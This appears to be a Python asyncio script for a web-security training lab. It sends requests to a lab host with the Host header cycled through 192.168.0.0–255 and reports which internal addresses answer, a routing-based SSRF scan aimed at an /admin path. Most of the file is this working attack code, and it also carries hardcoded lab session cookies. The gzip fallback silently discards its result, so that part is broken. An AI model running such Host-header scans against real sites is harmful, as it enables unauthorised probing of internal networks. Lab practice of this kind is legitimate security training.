import asyncio
import socket, ssl
import re
import time
import gzip
from typing import Union, Tuple

async def http_request(options):
    hostname, port, protocol, method, headers, path, fullpath = options['hostname'], options['port'], options['protocol'], options['method'], options['headers'], options['path'], options['fullpath']
    reader, writer = await asyncio.open_connection(hostname, port, ssl=protocol=='https')

    line_sep = '\r\n'
    headers_str = "".join(f'{k}: {v}{line_sep}' for k,v in options[ 'headers' ].items())

    if fullpath:
        hostpath = f'{protocol}://{hostname}{path}'
    else:
        hostpath = path

    request_str = f"{method} {hostpath} HTTP/1.1{line_sep}{headers_str}{line_sep}" # needs 2 \r\n at end of http message

    # print(request_str.encode('unicode_escape'))
    await asyncio.sleep(1)

    writer.write(request_str.encode())

    while True:
        line = await reader.readline()
        if not line:
            break

        try:
            line = line.decode('utf-8')
        except UnicodeDecodeError:
            gzip.decompress(line).decode('utf-8')
            


        if line:
            if line.startswith('HTTP'):
                status_code = line.split()[1]
                if not status_code.startswith('4') and not status_code.startswith('5'):
                    print('#' * 50)
                    print(headers['Host'], '\t', status_code)
                    print('#' * 50)

    # close the socket
    writer.close()


def parse_request_str(request_str: str, hostport_or_url: Union[Tuple[str, int], str], protocol: int, override_headers:dict={}, use_full_path: bool=False):
    # options = {
            # "protocol": 'https',
            # "hostname": 'ac721ff61ee76d2c80f6989e00c80029.web-security-academy.net',
            # "port": 443,
            # "path": '/',
            # "method": 'GET',
            # "headers": {
                # 'Host': f'192.168.0.{i}',
                # 'Connection': 'close',
                # 'Pragma': 'no-cache',
                # 'Cache-Control': 'no-cache',
                # 'Upgrade-Insecure-Requests': '1',
                # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
                # 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                # 'Sec-Fetch-Site': 'none',
                # 'Sec-Fetch-Mode': 'navigate',
                # 'Sec-Fetch-User': '?1',
                # 'Sec-Fetch-Dest': 'document',
                # 'Accept-Encoding': 'gzip, deflate',
                # 'Cookie': '_lab=46%7cMCwCFBWdLosKzxSMA4%2bH3FE9O3Q4XTiuAhQCWNerBIz9WKV9WpSBLI9HQ7sR7Hwh7iCk98cGKKJvyiPyYzaiolCTSZ1uMAtPTepo7W0CiDhC%2fXnQcMr7WV2VBWaIMxNCdcJg8BffROxDQy3rnfyEZfBq1V6V1NAAQCIOJY41zNKoBak%3d; session=q1fiAZpbFMVzvf9Hrj6yUhF5lDBh1fmb'
                # }
            # }
    if isinstance(hostport_or_url, tuple):
        hostname_regex = re.compile( r'^(?!(\w+://))((?!/).)*$' )
        hostname, port = hostport_or_url
        assert hostname_regex.match(hostname), 'Invalid hostname'
    else:
        hostport_or_url = hostport_or_url.strip()
        url_regex = re.compile( r'(?:(?P<protocol>\w+)://)?(?P<hostname>[^:/]+)(?:[:](?P<port>\d+))?(?P<path>(?:[/]\S*)+)?' )
        url_match = url_regex.match(hostport_or_url) 
        assert url_match, 'Invalid url'

        hostname = url_match.group("hostname")
        port =  url_match.group("port")
        # path = url_match.group("path")

        if not port:
            raise Exception("Port is required")

        # if not path:
            # path = '/'

    lines = list(map(str.strip, request_str.split('\n')))
    method, path, _ = lines[0].split()
    lines.pop(0)
    headers = dict(map(str.strip, s.split(":")) for s in lines if s)

    if override_headers:
        headers.update(override_headers)

    options = {
            'fullpath': use_full_path,
            'protocol': protocol,
            'hostname': hostname,
            'port': port,
            'path': path,
            'method': method,
            'headers': headers,
            }

    return options



async def main():

    request_str = """GET /admin HTTP/1.1
    Host: acf51f1f1f17554c80cb120800a30039.web-security-academy.net
    Connection: close
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Sec-Fetch-Site: none
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Accept-Encoding: deflate
    Accept-Language: en-US,en;q=0.9
    Cookie: _lab=46%7cMCwCFBGLICUA1sDdR5sBSSrCxgXqz9cMAhRwkwbbrr4MS3Ui8O6RC2z34VA6jhfafNzMIQehHvjsr2xNdou1wLV1c44UoAVeU1BS78y11V7EehqEdzOhdQF9y%2b8uVJmNEvLv4Gryya3kafTfohcYLwujvWXSK2CEL0NWUb6fiDJw9ho%3d; session=AJ7oKjPD041veQiqNC23FbhsRKbI1Zds

    """
    tasks = []

    # options = parse_request_str(request_str,  ('acf51f1f1f17554c80cb120800a30039.web-security-academy.net', 443), 'https')

    # options = {
            # "protocol": 'https',
            # "hostname": 'acf51f1f1f17554c80cb120800a30039.web-security-academy.net',
            # "port": 443,
            # "path": '/',
            # "method": 'GET',
            # "headers": {
                # 'Host': 'acf51f1f1f17554c80cb120800a30039.web-security-academy.net',
                # 'Connection': 'close',
                # 'Cache-Control': 'max-age=0',
                # 'Upgrade-Insecure-Requests': '1',
                # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
                # 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                # 'Sec-Fetch-Site': 'none',
                # 'Sec-Fetch-Mode': 'navigate',
                # 'Sec-Fetch-User': '?1',
                # 'Sec-Fetch-Dest': 'document',
                # 'Accept-Encoding': 'deflate',
                # 'Cookie': '_lab=46%7cMCwCFBGLICUA1sDdR5sBSSrCxgXqz9cMAhRwkwbbrr4MS3Ui8O6RC2z34VA6jhfafNzMIQehHvjsr2xNdou1wLV1c44UoAVeU1BS78y11V7EehqEdzOhdQF9y%2b8uVJmNEvLv4Gryya3kafTfohcYLwujvWXSK2CEL0NWUb6fiDJw9ho%3d; session=AJ7oKjPD041veQiqNC23FbhsRKbI1Zds'
                # }
            # }

    for i in range(256):
        options = parse_request_str(request_str,  ('acf51f1f1f17554c80cb120800a30039.web-security-academy.net', 443), 'https', use_full_path=True)
        options['headers']["Host"] = f'192.168.0.{i}'
        tasks.append(http_request(options))


    # tasks.append(http_request(options))
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
